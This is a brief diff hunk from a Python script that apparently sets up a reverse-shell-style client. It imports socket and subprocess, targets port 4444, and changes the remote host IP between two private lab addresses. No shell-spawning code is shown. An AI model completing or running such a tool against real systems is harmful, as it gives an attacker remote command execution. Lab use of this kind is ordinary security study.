@@ -5,7 +5,7 @@ import socket
 import subprocess
 
 # Set up IP and sockets
-REMOTE_HOST = '10.0.2.5'
+REMOTE_HOST = '10.0.2.15'
 REMOTE_PORT = 4444
 client = socket.socket()
 
